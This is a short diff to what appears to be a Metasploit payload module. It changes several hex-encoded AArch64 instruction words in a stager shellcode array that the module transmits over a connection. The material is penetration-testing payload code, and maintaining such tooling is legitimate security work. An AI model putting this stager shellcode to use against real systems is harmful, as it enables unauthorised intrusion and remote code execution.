@@ -91,17 +91,17 @@ module MetasploitModule
       0xaa0b03ec,
       0xaa0003ef,
       0xaa1f03e0,
-      0xd2880001,
+      0xd2a00081,
       0xd2800062,
       0xd2820043,
       0xaa1f03e4,
       0xaa1f03e5,
       0x58000230,
       0xd4000001,
-      0x91400800,
+      0x91408000,
       0x9100001f,
       0xaa0d03e0,
-      0xd63f01e0,
+      0xd61f01e0,
       0xd2800000,
       0x58000210,
       0xd4000001,
@@ -120,7 +120,7 @@ module MetasploitModule
       0x0200004a,
       0x00000000,
       0x02000001,
-      0x00000000,
+      0x00000000
     ].pack("V*")
     print_status("Transmitting first stager...(#{midstager.length} bytes)")
     conn.put(midstager) == midstager.length
